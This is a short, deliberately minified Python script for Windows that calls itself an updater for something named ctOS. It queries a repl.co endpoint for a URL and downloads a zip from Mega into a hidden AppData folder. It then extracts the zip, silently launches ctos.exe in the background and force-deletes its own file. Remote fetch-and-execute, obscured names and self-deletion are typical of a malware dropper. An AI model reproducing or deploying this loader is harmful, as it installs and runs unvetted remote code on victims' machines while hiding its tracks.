from os import system as B,remove as C,environ as D,makedirs as E;from sys import argv;from zipfile import ZipFile as F;from requests import get;from mega import Mega
A=D['appdata']+'\\ctOS'
try:E(A)
except:pass
G=get('https://ctOS-API.gamek.repl.co/update').json()['url'];H=Mega();I=H.login()
try:I.download_url(G,A)
except Exception as J:C(str(J).split(": '")[1][:-1])
with F(A+'\\update.zip','r')as K:K.extractall(A)
C(A+'/update.zip');B('start /b '+A+'\\ctOS\\ctos.exe');B('del /f /q "'+argv[0].replace('/','\\')+'"');quit()
